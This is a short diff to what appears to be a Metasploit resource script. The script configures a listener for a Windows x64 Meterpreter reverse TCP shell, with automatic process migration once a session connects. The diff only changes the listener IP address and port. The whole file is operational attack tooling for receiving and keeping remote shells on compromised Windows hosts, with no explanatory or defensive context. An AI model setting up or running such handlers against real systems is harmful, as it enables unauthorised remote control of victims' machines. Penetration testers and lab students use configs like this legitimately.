@@ -1,7 +1,7 @@
 use exploit/multi/handler
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST 10.13.13.37
-set LPORT 31337
+set LHOST 192.168.0.184
+set LPORT 1337
 set EXITFUNC thread
 set AutoRunScript post/windows/manage/migrate
 run -j
